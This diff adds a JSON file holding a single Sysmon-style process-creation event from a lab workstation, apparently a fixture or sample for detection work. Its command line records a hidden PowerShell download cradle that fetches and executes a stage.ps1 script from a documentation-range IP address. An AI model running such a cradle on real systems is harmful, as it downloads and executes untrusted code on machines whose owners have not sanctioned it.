@@ -1,0 +1,15 @@
+[
+  {
+    "EventID": 1,
+    "UtcTime": "2026-01-15 10:03:12.101",
+    "Computer": "WS-LAB-07.lab.local",
+    "User": "LAB\\analyst",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "OriginalFileName": "PowerShell.EXE",
+    "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/stage.ps1')\"",
+    "CurrentDirectory": "C:\\Users\\analyst\\",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\"",
+    "IntegrityLevel": "Medium"
+  }
+]
